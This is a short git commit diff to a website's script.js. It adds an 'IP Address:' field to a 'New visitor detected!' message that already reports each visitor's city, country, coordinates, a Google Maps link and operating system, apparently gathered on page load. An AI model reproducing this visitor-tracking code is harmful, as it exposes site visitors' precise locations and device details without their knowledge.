841a7ae6df818e3d31a3fb151775f3003ae54d4f
VIKASH J <112776733+Vikash888@users.noreply.github.com>
2025-03-12 19:34:07 +0530

    Update script.js

--- script.js
+++ script.js
@@ -249,6 +249,7 @@ document.addEventListener('DOMContentLoaded', function () {
         const message = {
             content: `
 New visitor detected!
+IP Address: 
 Location: ${location.country}, ${location.city} (${location.latitude}, ${location.longitude})
 Google Maps: ${googleMapsUrl}
 Operating System: ${os}
